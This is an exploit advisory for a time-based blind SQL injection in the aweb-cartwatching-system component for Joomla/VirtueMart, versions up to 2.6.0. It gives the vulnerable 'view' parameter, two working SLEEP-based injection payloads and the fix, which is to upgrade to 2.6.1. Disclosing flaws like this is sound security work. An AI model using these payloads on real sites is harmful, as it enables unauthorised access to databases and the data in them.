 Exploit Title: Sqli Blind Timebased on Joomla + Viertuemart + aweb-cartwatching-system/<= 2.6.0
 Date: 28-12-2016
 Software Link: http://awebsupport.com/products/aweb-cartwatching-system
 Exploit Author: Javi Espejo(qemm)
 Contact: http://twitter.com/javiespejo
 Website: http://raipson.com
 CVE: REQUESTED
 Category: webapps
 
1. Description
   
Any remote user can access to the victim server trough an SQLI Blind Injection on a component of aweb_cartwatching_system and aweb_cart_autosave
This is the code that has the parameters with the parameters not sanitized (IMAGE 1 )  

2. Proof of Concept

I can access to the database through queries with the Timebased vector.
I test with a client environment and I found that the paremeter POST view on http://test.xxxxx.com/es/index.php responds to a vector as follows:
 The first request was
 http://test.xxxxx.com/es/index.php

 POST parameters:
 option
 view
 task
 
Then I saw an strange behavior on the web and then I see that the parameter view responds to an easy timebased query
http://test.xxxxx.com/es/index.php?option=com_virtuemart&view=categorysearch%27+%2F+sleep%285%29+%2F+%27&task=smartSearch


Later I found the next payload

option=com_virtuemart&view=categorysearch' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))sgjA) AND 'jHwz'='jHwz&task=smartSearch and it works and I can access to every database on the client system launching other queries.
   
3. Solution:
   
Update to version 2.6.1 from the update center of joomla.
The Joomla vel publish the vulnerability on
Answer from Joomla VEL "We have added it to the VEL here: https://vel.joomla.org/resolved/1897-aweb-cart-watching-system-2-6-0"
http://awebsupport.com/

Regards 

Qemm
